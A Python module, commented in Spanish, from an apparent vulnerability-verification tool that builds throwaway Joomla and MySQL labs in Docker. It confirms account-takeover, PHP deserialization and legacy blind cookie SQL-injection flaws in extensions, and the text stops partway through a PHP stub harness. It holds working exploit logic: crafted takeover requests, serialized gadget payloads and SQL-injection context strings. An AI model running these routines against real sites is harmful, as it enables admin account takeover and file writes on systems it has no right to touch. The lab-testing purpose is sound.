"""Dynamic verifier: el equivalente a wpverify.py/drupalverify.py pero para Joomla. Mismo contrato
y mismo nivel de exigencia (ver wpverify.py para la filosofia completa). Copia estructural
deliberada, no una abstraccion compartida -- ver el docstring de drupalverify.py para el porque.

Primer paso ("poco a poco"): empezo cubriendo solo missing-authorization/idor
(account-takeover), el mismo caso con el que empezaron WordPress y Drupal; ahora tambien cubre
deserializacion (verify_joomla_deserialization) y, para extensiones LEGACY que ni arrancan en
este laboratorio, SQLi ciega por cookie contra el codigo real ejecutado fuera del CMS (ver
verify_joomla_legacy_module_sqli_cookie mas abajo).

A diferencia de Drupal, la imagen oficial `joomla:*-apache` SI soporta una instalacion
desatendida completa por variables de entorno (JOOMLA_DB_*/JOOMLA_SITE_NAME/JOOMLA_ADMIN_*) --
confirmado en vivo contra un MySQL real en este mismo entorno de desarrollo antes de escribir
este modulo: el propio `entrypoint.sh` de la imagen oficial llama a
`installation/joomla.php install --site-name=... --admin-...` con esas variables, asi que no
hace falta construir ninguna imagen derivada (a diferencia de Drupal, que si necesito anadirle
Drush). Diferencias confirmadas en vivo que importan:

  - Joomla 5 EXIGE MySQL >= 8.0.13 -- con mysql:5.7 (el que usan WordPress/Drupal) el instalador
    aborta con "You need MySQL 8.0.13 or higher". Este modulo usa mysql:8.0.
  - El usuario admin NO tiene un ID fijo (ni 1 como WordPress, ni 1 como el uid de Drupal): en una
    instalacion de prueba real salio id=733. Se lee el ID real por SQL directo tras crearlo
    (ver _Lab.mysql_query), nunca se asume un numero.
  - El login real de frontend es `/index.php?option=com_users&task=user.login` con un campo
    anti-CSRF cuyo NOMBRE (no el valor, que siempre es "1") es un hash de 32 caracteres hex por
    sesion -- se scrapea igual que el nonce de WordPress o el form_build_id de Drupal. La cookie
    `joomla_user_state=logged_in` es la señal de exito, mas limpia que buscar texto en la pagina.
  - El propio CLI oficial de Joomla (cli/joomla.php, ya incluido en la imagen, a diferencia de
    Drupal que necesito anadir Drush) trae `user:add --usergroup=Registered` para crear el
    usuario de bajo privilegio y `extension:install --path=<zip> --no-interaction` para instalar
    una extension -- exactamente la misma llamada que usa el propio entrypoint oficial para
    JOOMLA_EXTENSIONS_PATHS. Confirmado en vivo (investigando CVE-2025-40636, mod_vvisit_counter
    2.0.4j3) contra una extension de TERCEROS real descargada: `extension:install` funciono a la
    primera. Lo que SI fallo en vivo fue la propia extension: su codigo (de la era Joomla 3) usa
    el API legacy de JDatabaseDriver (`$db->query()`, `$db->Quote()`, `$db->getErrorNum()`,
    `$db->getErrorMsg()`) que Joomla 4 Y 5 borraron del paquete `joomla/database` (solo queda
    `execute()`/`quote()`, confirmado leyendo su propio DatabaseDriver.php) -- la extension fatal
    con "Call to undefined method" en el primer acceso a BD, antes de renderizar nada. Una
    extension de esta era (muy comun: casi toda la generacion Joomla 1.5/2.5/3.x usaba ese API)
    simplemente no arranca en este laboratorio Joomla 5 -- ver
    verify_joomla_legacy_module_sqli_cookie mas abajo para el camino alternativo que esta version
    anade para ese caso (ejecutar el codigo real fuera del CMS, con un arnes PHP minimo que solo
    repone esos nombres de metodo).

Requiere un Docker DAEMON alcanzable (mismo chequeo honesto que los otros dos). No necesita
construir nada ni tener internet en tiempo de ejecucion -- solo pulls de imagenes publicas
(joomla, mysql), igual que WordPress."""
from __future__ import annotations

import base64
import io
import os
import re
import secrets
import shutil
import subprocess
import tempfile
import time
import zipfile
from dataclasses import dataclass, field
from typing import Callable, List, Optional, Tuple

from .wpverify import (WpVerifyResult, _docker_daemon_ok, _lab_host, _pick_param,
                       _screenshot_response, _token, _ID_HINTS, _EMAIL_HINTS, _PASS_HINTS)

_MYSQL_IMAGE = "mysql:8.0"           # Joomla 5 exige >=8.0.13 -- confirmado en vivo, 5.7 no vale
_JOOMLA_IMAGE = "joomla:5-apache"


def _run(cmd: List[str], timeout: float = 60.0, input_text=None,
        input_bytes: Optional[bytes] = None) -> subprocess.CompletedProcess:
    if input_bytes is not None:
        return subprocess.run(cmd, capture_output=True, timeout=timeout, input=input_bytes)
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, input=input_text)


class _Lab:
    """Recursos Docker efimeros de una verificacion de Joomla (red + 2 contenedores). Sin volumen
    compartido -- Joomla copia su propio codigo DENTRO del contenedor en el primer arranque
    (confirmado en los logs reales: 'Joomla not found in /var/www/html - copying now...'), y el
    CLI oficial (cli/joomla.php) ya vive ahi, asi que todo va por `docker exec` directo contra el
    contenedor ya vivo, igual que drupalverify.py."""

    def __init__(self, tag: str):
        self.tag = tag
        self.net = f"binoracle-joomlaverify-{tag}"
        self.mysql = f"binoracle-joomlaverify-{tag}-db"
        self.joomla = f"binoracle-joomlaverify-{tag}-cms"
        self._created: List[tuple] = []

    def sh(self, *args, timeout=60.0, input_text=None, input_bytes=None):
        return _run(["docker"] + list(args), timeout=timeout, input_text=input_text,
                   input_bytes=input_bytes)

    def setup_network(self):
        self.sh("network", "create", self.net, timeout=30)
        self._created.append(("network", self.net))

    def start_mysql(self, root_pw: str, db_pw: str):
        self.db_pw = db_pw   # recordada para mysql_query() -- ver su docstring
        self.sh("run", "-d", "--name", self.mysql, "--network", self.net, "--platform", "linux/amd64",
               "-e", f"MYSQL_ROOT_PASSWORD={root_pw}", "-e", "MYSQL_DATABASE=joomla",
               "-e", "MYSQL_USER=joomla", "-e", f"MYSQL_PASSWORD={db_pw}", _MYSQL_IMAGE,
               timeout=90)
        self._created.append(("container", self.mysql))

    def mysql_ready(self, db_pw: str, tries: int = 150, delay: float = 3.0) -> bool:
        for _ in range(tries):
            r = self.sh("exec", self.mysql, "mysqladmin", "ping", "-ujoomla",
                       f"-p{db_pw}", "-h", "127.0.0.1", timeout=10)
            if r.returncode == 0:
                return True
            time.sleep(delay)
        return False

    def mysql_query(self, sql: str, timeout: float = 15.0) -> str:
        """Consulta SQL directa (con las credenciales que YO misma fije en start_mysql, guardadas
        en self.db_pw) -- necesaria porque, a diferencia de wp-cli/Drush, el CLI de Joomla no
        tiene un comando de 'leer un solo campo' limpio para parsear (user:list imprime una tabla
        ASCII)."""
        r = self.sh("exec", self.mysql, "mysql", "-ujoomla", f"-p{self.db_pw}", "joomla",
                   "--silent", "--skip-column-names", "-e", sql, timeout=timeout)
        return (r.stdout or "").strip()

    def start_joomla(self, db_pw: str, admin_user: str, admin_pass: str, admin_email: str,
                     admin_name: str) -> Optional[str]:
        """Instalacion desatendida REAL via las variables de entorno oficiales -- ver el docstring
        del modulo. Publica el puerto 80 en un puerto aleatorio de 0.0.0.0 (mismo razonamiento de
        Docker-fuera-de-Docker que el resto de laboratorios, ver _lab_host())."""
        self.sh("run", "-d", "--name", self.joomla, "--network", self.net, "--platform", "linux/amd64",
               "-e", f"JOOMLA_DB_HOST={self.mysql}", "-e", "JOOMLA_DB_USER=joomla",
               "-e", f"JOOMLA_DB_PASSWORD={db_pw}", "-e", "JOOMLA_DB_NAME=joomla",
               "-e", "JOOMLA_SITE_NAME=binoracle-lab", "-e", f"JOOMLA_ADMIN_EMAIL={admin_email}",
               "-e", f"JOOMLA_ADMIN_USERNAME={admin_user}", "-e", f"JOOMLA_ADMIN_USER={admin_name}",
               "-e", f"JOOMLA_ADMIN_PASSWORD={admin_pass}",
               "-p", "0.0.0.0::80", _JOOMLA_IMAGE, timeout=90)
        self._created.append(("container", self.joomla))
        r = self.sh("port", self.joomla, "80", timeout=15)
        m = re.search(r":(\d+)\s*$", (r.stdout or "").strip())
        return m.group(1) if m else None

    def install_ready(self, tries: int = 100, delay: float = 3.0) -> bool:
        """Espera a que el entrypoint oficial termine SU PROPIA instalacion desatendida (el log
        real dice 'Joomla has been installed' -- se sondea el log en vez de solo el puerto HTTP,
        porque Apache ya responde ANTES de que la instalacion interna termine)."""
        for _ in range(tries):
            r = self.sh("logs", self.joomla, timeout=10)
            out = (r.stdout or "") + (r.stderr or "")
            if "Joomla has been installed" in out:
                return True
            if "ERROR" in out and "Joomla has been installed" not in out:
                # un error real de instalacion no se va a arreglar esperando mas -- pero se sigue
                # esperando igual un poco por si es un warning transitorio de conexion a la BD
                pass
            time.sleep(delay)
        return False

    def http_ready(self, port: str, tries: int = 100, delay: float = 3.0) -> bool:
        import urllib.request
        url = f"http://{_lab_host()}:{port}/"
        for _ in range(tries):
            try:
                with urllib.request.urlopen(url, timeout=5) as r:
                    if r.status < 500:
                        return True
            except Exception:
                pass
            time.sleep(delay)
        return False

    def logs_tail(self, name: str, lines: int = 60) -> str:
        try:
            r = self.sh("logs", "--tail", str(lines), name, timeout=15)
            return ((r.stdout or "") + (r.stderr or "")).strip()
        except Exception as e:
            return f"(no se pudieron leer logs de {name}: {e})"

    def joomla_cli(self, *args, timeout: float = 120.0) -> subprocess.CompletedProcess:
        return self.sh("exec", "-w", "/var/www/html", self.joomla, "php", "cli/joomla.php",
                       *args, "--no-interaction", timeout=timeout)

    def write_canary(self, path: str, content: str, timeout: float = 15.0) -> bool:
        r = self.sh("exec", "-i", self.joomla, "sh", "-c", f"cat > {path}",
                    input_text=content, timeout=timeout)
        return r.returncode == 0

    def install_extension(self, host_ext_dir: str, slug: str, timeout: float = 90.0) -> bool:
        """Empaqueta la extension (en `host_ext_dir/slug`) como el .zip que Joomla espera subir
        (el manifest XML en la RAIZ del zip, no envuelto en una carpeta extra -- el formato
        distribuible estandar), lo copia al contenedor por `docker exec -i` (sin volumen
        compartido, igual que drupalverify.py) y lo instala con el CLI oficial -- la MISMA
        llamada que usa el propio entrypoint de la imagen para JOOMLA_EXTENSIONS_PATHS."""
        ext_path = os.path.join(host_ext_dir, slug)
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for root, _dirs, files in os.walk(ext_path):
                for fn in files:
                    full = os.path.join(root, fn)
                    rel = os.path.relpath(full, ext_path)
                    zf.write(full, rel)
        remote_zip = f"/tmp/binoracle_ext_{_token()}.zip"
        try:
            r = self.sh("exec", "-i", self.joomla, "sh", "-c", f"cat > {remote_zip}",
                       input_bytes=buf.getvalue(), timeout=timeout)
            if r.returncode != 0:
                return False
        except subprocess.TimeoutExpired:
            return False
        r2 = self.joomla_cli("extension:install", f"--path={remote_zip}", timeout=timeout)
        return r2.returncode == 0

    def teardown(self):
        for kind, name in reversed(self._created):
            try:
                if kind == "container":
                    self.sh("rm", "-f", name, timeout=30)
                elif kind == "network":
                    self.sh("network", "rm", name, timeout=15)
            except Exception:
                pass


def _joomla_login(base_url: str, user: str, password: str, timeout: float = 15.0):
    """Login real por el formulario de /index.php?option=com_users&view=login (no un shortcut de
    CLI): Joomla exige un campo anti-CSRF cuyo NOMBRE (no valor, siempre '1') es un hash de 32
    caracteres hex unico por sesion -- confirmado en vivo. La cookie 'joomla_user_state=logged_in'
    es la señal de exito (mas limpia que buscar texto en la pagina).

    requests.Session() DIRECTAMENTE, nunca _make_session() -- este login es parte del
    laboratorio efimero, que nunca debe ir por Burp aunque este configurado (ver _lab_host() en
    wpverify.py)."""
    import requests
    s = requests.Session()
    try:
        r0 = s.get(f"{base_url}/index.php?option=com_users&view=login", timeout=timeout,
                  allow_redirects=True)
        m = re.search(r'name="([a-f0-9]{32})"\s+value="1"', r0.text or "")
        token_field = m.group(1) if m else None
        data = {"username": user, "password": password, "option": "com_users",
               "task": "user.login", "return": ""}
        if token_field:
            data[token_field] = "1"
        s.post(f"{base_url}/index.php?option=com_users&task=user.login", data=data,
              timeout=timeout, allow_redirects=True)
    except Exception:
        return None
    return s if s.cookies.get("joomla_user_state") == "logged_in" else None


def _check_prereqs(ext_source_dir: str, slug: str) -> Optional[WpVerifyResult]:
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable (o sin CLI de docker instalado)"
        res.limitations.append("verificacion dinamica NO intentada: revisa que Docker Desktop/"
                               "dockerd este arrancado y, si binoracle corre dentro de Docker, "
                               "que el socket del host este montado en docker-compose.yml")
        return res
    if not os.path.isdir(os.path.join(ext_source_dir, slug)):
        res.detail = f"no se encuentra {slug}/ dentro de {ext_source_dir}"
        res.limitations.append("el codigo de la extension no tiene la forma esperada (<slug>/...)")
        return res
    return None


@dataclass
class _JoomlaLabSession:
    lab: "_Lab"
    base_url: str
    admin_user: str
    admin_pass: str
    admin_id: str
    sub_user: str
    sub_pass: str
    sub_sess: object
    admin_sess: object
    shots: list = field(default_factory=list)


def _bootstrap_joomla_lab(lab: "_Lab", ext_source_dir: str, slug: str, step,
                          res: WpVerifyResult, t0: float,
                          budget_s: float) -> Optional[_JoomlaLabSession]:
    """Pasos 1-4 compartidos, analogos a _bootstrap_lab()/_bootstrap_drupal_lab(): Joomla
    instalado (via el entrypoint oficial, desatendido), extension activa, usuario de bajo
    privilegio creado y logueado. Devuelve None si algo falla, con `res` ya relleno."""
    root_pw, db_pw = secrets.token_urlsafe(16), secrets.token_urlsafe(16)
    # JOOMLA_ADMIN_USERNAME debe ser SOLO alfabetico (sin guion bajo ni numeros) -- el propio
    # entrypoint lo valida con una regex [^a-zA-Z] y aborta si no cumple (confirmado en vivo: con
    # guion bajo la instalacion desatendida nunca llega a ejecutarse, solo avisa y se queda
    # a medio arrancar). El subscriber, creado despues via CLI, NO tiene esa restriccion.
    admin_user, admin_pass = "binoracleadmin", secrets.token_urlsafe(12) + "A1!"
    sub_user, sub_pass = "binoracle_sub", secrets.token_urlsafe(12) + "A1!"

    step("levantando laboratorio Joomla+MySQL aislado en Docker (red propia)...")
    lab.setup_network()
    lab.start_mysql(root_pw, db_pw)
    if not lab.mysql_ready(db_pw):
        res.detail = "MySQL no respondio a tiempo"
        res.logs.append("docker logs (mysql):\n" + lab.logs_tail(lab.mysql))
        return None
    step("MySQL listo; arrancando Joomla (instalacion desatendida oficial)...")
    port = lab.start_joomla(db_pw, admin_user, admin_pass, "admin@binoracle-lab.invalid",
                            "Binoracle Admin")
    if not port:
        res.detail = "no se pudo publicar el puerto de Joomla"
        res.logs.append("docker logs (joomla):\n" + lab.logs_tail(lab.joomla))
        return None
    if not lab.install_ready():
        res.detail = "la instalacion desatendida de Joomla no termino a tiempo"
        res.logs.append("docker logs (joomla):\n" + lab.logs_tail(lab.joomla))
        return None
    if not lab.http_ready(port):
        res.detail = "Joomla no respondio a tiempo"
        res.logs.append("docker logs (joomla):\n" + lab.logs_tail(lab.joomla))
        return None
    base_url = f"http://{_lab_host()}:{port}"
    step(f"Joomla listo en {base_url}; leyendo el ID real del admin (no es fijo en Joomla, a "
         f"diferencia de WordPress/Drupal)...")
    admin_id = lab.mysql_query(f"SELECT id FROM joom_users WHERE username='{admin_user}';")
    if not admin_id.isdigit():
        res.detail = f"no se pudo leer el ID real del admin (salida: {admin_id!r})"
        return None
    step(f"admin id={admin_id}")

    step(f"copiando la extension ({slug}) al contenedor y activandola...")
    if not lab.install_extension(ext_source_dir, slug):
        res.detail = "no se pudo instalar la extension en el laboratorio"
        res.limitations.append("si el slug/version descargados no coinciden con el afectado, o "
                               "el .xml de manifiesto no esta donde extension:install lo espera, "
                               "la instalacion puede fallar")
        return None
    # `extension:install` instala pero NO publica -- confirmado en vivo: un plugin recien
    # instalado queda con enabled=0 en #__extensions, y la peticion de ataque devolvia 404 (el
    # evento del plugin nunca se disparaba) hasta publicarlo por SQL directo. Los componentes
    # normalmente quedan activos solos, pero publicar siempre (WHERE element=slug) es inofensivo
    # si ya lo estaba, y necesario cuando es un plugin o un modulo.
    lab.mysql_query(f"UPDATE joom_extensions SET enabled=1 WHERE element='{slug}';")
    step("extension instalada y publicada. Creando el usuario de bajo privilegio...")

    r = lab.joomla_cli("user:add", f"--username={sub_user}", "--name=Binoracle Sub",
                       f"--password={sub_pass}", "--email=sub@binoracle-lab.invalid",
                       "--usergroup=Registered")
    if r.returncode != 0:
        res.detail = f"creacion del usuario de bajo privilegio fallo: {(r.stderr or r.stdout or '')[:300]}"
        return None

    if budget_s - (time.time() - t0) < 30:
        res.detail = "presupuesto de tiempo agotado antes de intentar el ataque"
        return None

    step(f"iniciando sesion como '{sub_user}' (bajo privilegio, via el formulario real)...")
    sub_sess = _joomla_login(base_url, sub_user, sub_pass)
    if sub_sess is None:
        res.detail = "no se pudo iniciar sesion como el usuario de bajo privilegio"
        return None
    res.logs.append(f"login subscriber: OK ({sub_user})")

    admin_sess = _joomla_login(base_url, admin_user, admin_pass)

    return _JoomlaLabSession(lab=lab, base_url=base_url, admin_user=admin_user,
                             admin_pass=admin_pass, admin_id=admin_id, sub_user=sub_user,
                             sub_pass=sub_pass, sub_sess=sub_sess, admin_sess=admin_sess,
                             shots=[])


def verify_joomla_account_takeover(
    ext_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, id_param_hint: str = "", email_param_hint: str = "", pass_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Equivalente Joomla de verify_wordpress_account_takeover/verify_drupal_account_takeover: una
    extension donde un usuario autenticado de bajo privilegio puede cambiar el email/password de
    OTRO usuario (el admin real, con su ID real -- leido por SQL, nunca asumido) porque el
    controlador confia en un ID del request en vez de comprobarlo contra la sesion. `verified`
    SOLO pasa a True con un SEGUNDO login independiente o una lectura real de la BD, nunca por un
    200/302."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(ext_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    id_p = id_param_hint or _pick_param(parameters, _ID_HINTS)
    email_p = email_param_hint or _pick_param(parameters, _EMAIL_HINTS)
    pass_p = pass_param_hint or _pick_param(parameters, _PASS_HINTS)
    if not (email_p or pass_p):
        res.detail = "no se identifico un parametro de email ni de password en la hipotesis"
        res.limitations.append("la verificacion de account-takeover necesita un parametro de "
                               "email o de password; afina 'parameters' en la hipotesis del LLM "
                               "o pasalos a mano")
        return res

    lab = _Lab(_token())
    try:
        boot = _bootstrap_joomla_lab(lab, ext_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        m = (http_method or "POST").upper()
        payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
        if id_p:
            payload[id_p] = boot.admin_id
        new_email = f"takeover-{_token()}@binoracle-lab.invalid" if email_p else None
        new_pass = secrets.token_urlsafe(10) + "A1!" if pass_p else None
        if email_p:
            payload[email_p] = new_email
        if pass_p:
            payload[pass_p] = new_pass

        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "admin_id_objetivo": boot.admin_id, "payload_enviado": payload,
            "metodo": m, "endpoint": endpoint,
        })
        step(f"enviando la peticion -- sesion de '{boot.sub_user}' (bajo privilegio) contra "
             f"{m} {endpoint}, apuntando al id={boot.admin_id}...")
        try:
            resp = boot.sub_sess.request(m, boot.base_url + endpoint,
                               data=payload if m != "GET" else None,
                               params=payload if m == "GET" else None, timeout=20)
            res.evidence["status_code_respuesta"] = resp.status_code
            boot.shots.append(_screenshot_response(
                boot.base_url + endpoint, m, resp.status_code, resp.text or "",
                "petición atacante → endpoint (account takeover Joomla)", lang="es"))
        except Exception as e:
            res.detail = f"la peticion fallo: {e}"
            return res

        confirmed = False
        if new_pass:
            step("confirmando: intentando iniciar sesion de nuevo como el admin con la password "
                 "NUEVA (la que esta peticion fijo)...")
            confirm_sess = _joomla_login(boot.base_url, boot.admin_user, new_pass)
            confirmed = confirm_sess is not None
            res.evidence["segundo_login_password_nueva"] = confirmed
        elif new_email:
            step("confirmando: releyendo el registro del usuario por SQL directo...")
            actual_email = lab.mysql_query(
                f"SELECT email FROM joom_users WHERE id={boot.admin_id};")
            confirmed = actual_email == new_email
            res.evidence["email_tras_peticion"] = actual_email
            res.evidence["email_esperado"] = new_email

        if confirmed:
            res.verified = True
            res.ok = True
            res.detail = (f"ACCOUNT TAKEOVER confirmado: la sesion de bajo privilegio "
                          f"('{boot.sub_user}') cambio de verdad la cuenta del admin real "
                          f"(id={boot.admin_id}) -- confirmado por un SEGUNDO login/lectura "
                          f"independiente, no por el codigo de la respuesta")
            step("VERIFICADO: account takeover confirmado en Joomla.")
            boot.shots.append(_screenshot_response(
                boot.base_url + endpoint, m, 200,
                "account takeover confirmado en Joomla",
                "VERIFICADO — account takeover Joomla confirmado", lang="es"))
        else:
            res.ok = True
            res.detail = ("se envio la peticion pero el efecto no se confirmo -- el account "
                          "takeover no se confirmo (puede que el endpoint/parametro no sean los "
                          "reales, o que el controlador si compruebe el id contra la sesion)")
        res.evidence["screenshots"] = boot.shots
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red)...")
        lab.teardown()


def verify_joomla_deserialization(
    ext_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, serial_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Segunda clase de Joomla ("poco a poco"): equivalente a verify_wordpress_deserialization/
    verify_drupal_deserialization. Mismo escaneo estatico del codigo real de la extension
    (find_file_write_gadget, ver deserialize_gadgets.py) seguido de la misma prueba dinamica
    dura."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(ext_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    from .deserialize_gadgets import find_file_write_gadget, build_php_serialized_object
    from .wpverify import _SERIAL_HINTS
    ext_root = os.path.join(ext_source_dir, slug)
    step("escaneando el codigo real en busca de un gadget de deserializacion (clase con "
         "__wakeup()/__destruct() que escriba a fichero)...")
    gadget = find_file_write_gadget(ext_root)
    if gadget is None:
        res.detail = ("no se encontro ningun gadget de deserializacion en el codigo de la "
                      "extension (una clase con __wakeup()/__destruct() que escriba una "
                      "propiedad publica a una ruta publica via file_put_contents())")
        res.limitations.append("la verificacion de deserializacion SOLO cubre gadgets dentro "
                               "del propio codigo de la extension (no cadenas de librerias de "
                               "terceros); si la extension no trae una clase asi, no hay nada "
                               "que verificar sin inventarse una cadena que no esta")
        return res
    step(f"gadget encontrado: clase '{gadget.full_class_name}' en {gadget.file}:{gadget.line} "
         f"({gadget.magic_method} -> file_put_contents($this->{gadget.path_prop}, "
         f"$this->{gadget.content_prop}))")

    serial_param = serial_param_hint or _pick_param(parameters, _SERIAL_HINTS)

    lab = _Lab(_token())
    try:
        boot = _bootstrap_joomla_lab(lab, ext_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        secret = secrets.token_hex(16)
        canary_path = f"/tmp/binoracle_deser_{_token()}.txt"
        payload_obj = build_php_serialized_object(gadget, canary_path, secret)
        m = (http_method or "POST").upper()
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "gadget_clase": gadget.full_class_name, "gadget_metodo": gadget.magic_method,
            "gadget_ubicacion": f"{gadget.file}:{gadget.line}", "canary_path": canary_path,
            "canary_secret": secret, "objeto_serializado": payload_obj,
            "serial_param": serial_param or "(cuerpo crudo)", "metodo": m, "endpoint": endpoint,
        })

        tried = []
        found = False
        first_jdeser_sent = []

        def try_send(label, **kwargs):
            nonlocal found
            step(f"probando {m} {endpoint} ({label})...")
            try:
                resp_d = boot.sub_sess.request(m, boot.base_url + endpoint, timeout=20, **kwargs)
                if not first_jdeser_sent:
                    first_jdeser_sent.append(True)
                    boot.shots.append(_screenshot_response(
                        boot.base_url + endpoint, m, resp_d.status_code, resp_d.text or "",
                        f"petición deserialización Joomla — {label}", lang="es"))
            except Exception as e:
                tried.append({"modo": label, "error": str(e)})
                return
            time.sleep(1)
            r = lab.sh("exec", lab.joomla, "sh", "-c", f"cat {canary_path} 2>/dev/null", timeout=10)
            content = (r.stdout or "")
            present = secret in content
            tried.append({"modo": label, "secreto_presente": present})
            if present and not found:
                found = True
                res.evidence["modo_ganador"] = label
                res.evidence["contenido_fichero"] = content[:500]
                step(f"VERIFICADO: el fichero {canary_path} contiene el secreto exacto -- "
                     f"unserialize() reconstruyo el objeto y {gadget.magic_method} se ejecuto.")
                boot.shots.append(_screenshot_response(
                    boot.base_url + endpoint, m, 200,
                    f"canary: {content[:300]}",
                    f"VERIFICADO — deserialization Joomla, gadget={gadget.full_class_name}",
                    highlight=secret, lang="es"))

        if serial_param:
            payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
            payload[serial_param] = payload_obj
            try_send("parametro de formulario",
                     data=payload if m != "GET" else None,
                     params=payload if m == "GET" else None)
        if not found:
            try_send("cuerpo crudo", data=payload_obj.encode())

        res.evidence["intentos"] = tried
        if found:
            res.verified = True
            res.ok = True
            res.detail = (f"DESERIALIZATION confirmada ({res.evidence['modo_ganador']}): el "
                          f"objeto PHP serializado de la clase '{gadget.full_class_name}' se "
                          f"reconstruyo de verdad y su {gadget.magic_method} escribio el secreto "
                          f"exacto en {canary_path}")
        else:
            res.ok = True
            res.detail = (f"se encontro el gadget '{gadget.full_class_name}' en el codigo pero "
                          f"ninguna forma de mandarlo ({len(tried)} probadas) hizo que el "
                          f"fichero canario apareciera con el secreto -- la deserializacion no "
                          f"se confirmo")
        res.evidence["screenshots"] = boot.shots
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red)...")
        lab.teardown()


# ---------------------------------------------------------------------------------------------
# Tercera clase de Joomla: SQLi ciega via cookie en una extension LEGACY (pre-4.0) que Joomla 5
# no puede ni arrancar. Ver el docstring de verify_joomla_legacy_module_sqli_cookie() para el
# porque de todo este bloque -- nace de investigar CVE-2025-40636 (mod_vvisit_counter 2.0.4j3,
# INCIBE-2025-0540) de verdad contra el codigo fuente real descargado, no de teoria.
# ---------------------------------------------------------------------------------------------

_PHP_CLI_IMAGE = "php:8.3-cli"
_LEGACY_SQLI_SLEEP_SECONDS = 4.0
# A diferencia de los contextos de genericverify.py (pensados para WHERE col='$val'), un modulo
# Joomla legacy tipico envuelve el valor en funciones SQL anidadas (confirmado en vivo contra
# CVE-2025-40636: "WHERE ip=UNHEX(SHA1('$ip'))", DOS parentesis de cierre) -- de ahi las variantes
# con ')) y ))) que genericverify.py no trae.
_LEGACY_SQLI_CONTEXTS = ("", "'", "')", "'))", "')))", '"', '")', '"))', '")))')
_LEGACY_SQLI_COMMENTS = ("-- -", "#")

# Entorno Joomla minimo de pega -- NO es un parche, NO sanea nada. Su unico trabajo es poner de
# vuelta los NOMBRES de metodo de JFactory/JDatabaseDriver/JURI que el paquete `joomla/database`
# que usan Joomla 4 Y 5 borro (query(), Quote(), getErrorNum(), getErrorMsg() -- confirmado en
# vivo leyendo su propio DatabaseDriver.php: solo quedan execute()/quote()), para que el codigo
# real SIN MODIFICAR de la extension legacy pueda correr lo bastante para llegar a su propia
# construccion de SQL. Cada metodo o no hace nada (helpers de UI/documento) o le pasa la query a
# mysqli SIN escapar ni reescribir nada -- exactamente lo que hacia el JDatabaseMySQLi real de
# Joomla 3, para que la vulnerabilidad se ejecute tal cual viene en el fichero descargado.
_LEGACY_STUBS_PHP = r"""<?php
define('_JEXEC', 1);
define('DS', DIRECTORY_SEPARATOR);
define('JPATH_BASE', '/tmp');
define('JPATH_SITE', '/tmp');

function jimport($p) {}

class JParamsStub {
    public function get($key, $default = null) { return $default; }
}

class JUserStub {
    public $guest = true;
}

class JDocumentStub {
    public function addStyleSheet($x) {}
}

class JFactory {
    private static $db = null;
    public static function getDBO() {
        if (self::$db === null) { self::$db = new JDatabaseStub(); }
        return self::$db;
    }
    public static function getUser() { return new JUserStub(); }
    public static function getDocument() { return new JDocumentStub(); }
    public static function getLanguage() { return new JLanguageStub(); }
}

class JLanguageStub { public function getTag() { return 'en-GB'; } }

class JLanguage {
    public static function getInstance($tag) { return new JLanguageInstanceStub(); }
}
class JLanguageInstanceStub {
    public function load($ext) { return true; }
    public function hasKey($string) { return false; }
    public function _($string, $interpretBackSlashes = true) { return $string; }
}
class JLanguageHelper {
    public static function detectLanguage() { return 'en-GB'; }
}

class JError {
    public static function raiseWarning($code, $msg) {
        fwrite(STDERR, "JError::raiseWarning($code): $msg\n");
    }
}

class JURI {
    public static function base($pathOnly = false) { return '/'; }
}

class JFile {
    public static function exists($p) { return false; }
    public static function read($p) { return ''; }
}

class JBrowser {
    public static function getInstance() { return new JBrowserStub(); }
}
class JBrowserStub {
    public function isRobot() { return false; }
}

/**
 * Re-implementacion fiel (solo los NOMBRES) del JDatabaseMySQLi legacy, contra una conexion
 * mysqli real a un MySQL real desechable. setQuery()/query()/loadRow()/loadResult()/
 * loadObject() no tocan, escapan ni reescriben el SQL en ningun momento -- se lo pasan a
 * mysqli_query() tal cual, igual que el driver real de Joomla 3 contra el que se escribio esta
 * extension.
 */
class JDatabaseStub {
    private $conn;
    private $sql = '';
    private $lastErrNo = 0;
    private $lastErrMsg = '';

    public function __construct() {
        $host = getenv('MVC_DB_HOST') ?: '127.0.0.1';
        $user = getenv('MVC_DB_USER') ?: 'root';
        $pass = getenv('MVC_DB_PASS') ?: '';
        $name = getenv('MVC_DB_NAME') ?: 'legacysqli';
        $this->conn = mysqli_connect($host, $user, $pass, $name);
        if (!$this->conn) {
            fwrite(STDERR, "mysqli_connect failed: " . mysqli_connect_error() . "\n");
            exit(1);
        }
    }

    public function setQuery($sql) {
        // Joomla sustituye el placeholder de prefijo '#__' en tiempo de query
        // (DatabaseDriver::replacePrefix) -- la MISMA sustitucion, nada mas.
        $prefix = getenv('MVC_DB_PREFIX') ?: 'jos_';
        $this->sql = str_replace('#__', $prefix, $sql);
        return $this;
    }

    public function query() {
